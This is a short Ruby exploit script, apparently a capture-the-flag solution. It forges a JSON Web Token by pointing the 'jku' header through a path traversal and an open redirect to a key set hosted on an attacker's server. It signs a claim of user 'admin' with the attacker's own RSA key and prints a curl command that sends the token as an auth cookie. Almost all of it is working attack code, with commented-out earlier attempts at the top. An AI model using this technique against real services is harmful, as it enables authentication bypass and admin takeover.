# http://[URL]/redirect?redirect_uri=/login

# http://[PUBLIC_IP]/jwks.json
# http://[URL]/redirect?redirect_uri=http://[PUBLIC_IP]/jwks.json
# header = {"typ":"JWT","alg":"RS256","jku":"http://[URL]/.well-known//jwks.json"}

header = {"typ":"JWT","alg":"RS256","jku":"http://[URL]/.well-known/../redirect?redirect_uri=http://[PUBLIC_IP]/jwks.json"}
body = {"user":"admin"}

require 'json'
require 'base64'
require 'openssl'

k = OpenSSL::PKey::RSA.new File.read "private.pem"
pub = k.public_key

puts Base64.urlsafe_encode64(pub.e.to_s(2), padding: false)
puts Base64.urlsafe_encode64(pub.n.to_s(2), padding: false)

data = Base64.urlsafe_encode64(header.to_json, padding: false) + "." + Base64.urlsafe_encode64(body.to_json, padding: false)

signature = k.sign("SHA256",data)

token = data + "." + Base64.urlsafe_encode64(signature, padding: false)

puts "curl -H 'Cookie: auth=#{token}' http://[URL]/"
